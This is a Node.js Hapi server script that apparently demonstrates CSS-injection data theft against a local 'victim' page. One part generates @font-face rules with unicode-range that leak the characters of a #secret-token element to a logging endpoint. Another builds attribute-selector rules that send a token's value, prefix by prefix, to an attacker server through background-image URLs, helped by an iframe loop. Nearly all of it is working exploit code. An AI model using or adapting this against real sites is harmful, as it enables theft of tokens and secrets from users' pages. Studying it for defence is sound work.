'use strict';

const Path = require('path');
const Hapi = require('hapi');

const server = new Hapi.Server({
    connections: {
        routes: {
            files: {
                relativeTo: Path.join(__dirname)
            }
        }
    }
});

const demo1Connection = server.connection({
    port: 3000,
    host: '0.0.0.0',
    routes: {
        cors: true,
        state: {
            parse: true,
            failAction: 'ignore',
        }
    },
});

const cookieConfig = {
    ttl: null,
    isSecure: false,
    isHttpOnly: false,
    encoding: 'base64json',
    isSameSite: false,
    clearInvalid: true, // remove invalid cookies
    strictHeader: false // don't allow violations of RFC 6265
}

demo1Connection.state('chars', cookieConfig);

















function createFontFaceForChar(char) {
    const hexCodePoint = char.codePointAt(0).toString(16)
    return `@font-face{
    font-family: hackerfont;
    src: url(http://localhost:3000/char/${char});
    unicode-range:U+00${hexCodePoint};
}`;
}

function createFontFacesForHex() {
    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    let result = '';
    for (const char of chars) {
        result += createFontFaceForChar(char) + '\n';
    }
    return result;
}












demo1Connection.route({
    method: 'GET',
    path: '/first-pass.css',
    handler: function (request, reply) {
        const chars = [];
        const fonts = createFontFacesForHex();
        reply(`
${fonts}
#secret-token {
    font-family: hackerfont !important;
}
        `.trim())
            .type('text/css')
            .state('chars', chars);
    }
});

let chars = [];
setInterval(() => chars = [], 1000);
demo1Connection.route({
    method: 'GET',
    path: '/char/{char}',
    handler: function (request, reply) {
        chars.push(request.params.char);
        console.log(chars);
        reply(``);
    }
});






const attackConnection = server.connection({
    port: 3001,
    host: '0.0.0.0',
    routes: {
        cors: true,
        state: {
            parse: true,
            failAction: 'ignore',
        }
    },
});

const victimServer = server.connection({
    port: 3002,
    host: '0.0.0.0',
    routes: {
        cors: true,
        state: {
            parse: true,
            failAction: 'ignore',
        }
    },
});

attackConnection.state('foundToken', cookieConfig);

const MAX_TOKEN_LENGTH = 10;
let foundToken = '';

function createAttributeSelectorFor(char) {
    return `
#secret-token[value^=${foundToken}${char}] {
    background-image: url(http://localhost:3001/token/${foundToken}${char});
}
    `.trim();
}

function createAttributeSelectors() {
    const chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
    let result = '';
    for (const char of chars) {
        result += createAttributeSelectorFor(char) + '\n';
    }
    return result;
}

attackConnection.route({
    method: 'GET',
    path: '/first-pass.css',
    handler: function (request, reply) {
        reply(createAttributeSelectors().trim()).type('text/css')
    }
});

attackConnection.route({
    method: 'GET',
    path: '/token/{token}',
    handler: function (request, reply) {
        foundToken = request.params.token;
        if (foundToken.length === MAX_TOKEN_LENGTH) {
            console.log('FOUND: ', foundToken);
        }
        reply(``);
    }
});

attackConnection.route({
    method: 'GET',
    path: '/iframe',
    handler(request, reply) {
        if (foundToken.length === MAX_TOKEN_LENGTH) {
            reply(`<h1>${foundToken}</h1>`).state('foundToken', '');
            foundToken = '';
        } else {
            reply.view('iframe2', { foundToken }).state('foundToken', foundToken);
        }
    }
});

victimServer.route({
    method: 'GET',
    path: '/',
    handler(request, reply) {
        reply.file('vulnerablesite2.html');
    }
});


server.register([require('inert'), require('vision'), require('h2o2')], (err) => {
    if (err) {
        throw err;
    }

    const lmgtfyConnection = server.connection({
        port: 3003,
        host: '0.0.0.0',
        routes: {
            cors: true
        },
    });

    lmgtfyConnection.route({
        method: 'GET',
        path: '/{path*}',
        handler: {
            proxy: {
                uri: 'http://lmgtfy.com/{path}'
            }
        }
    });

    server.views({
        engines: {
            html: require('handlebars')
        },
        relativeTo: __dirname
    });

    server.start((err) => {
        if (err) {
            throw err;
        }

        server.connections.forEach(connection => {
            console.log('Server started at: ' + connection.info.uri);
        });
    });
});

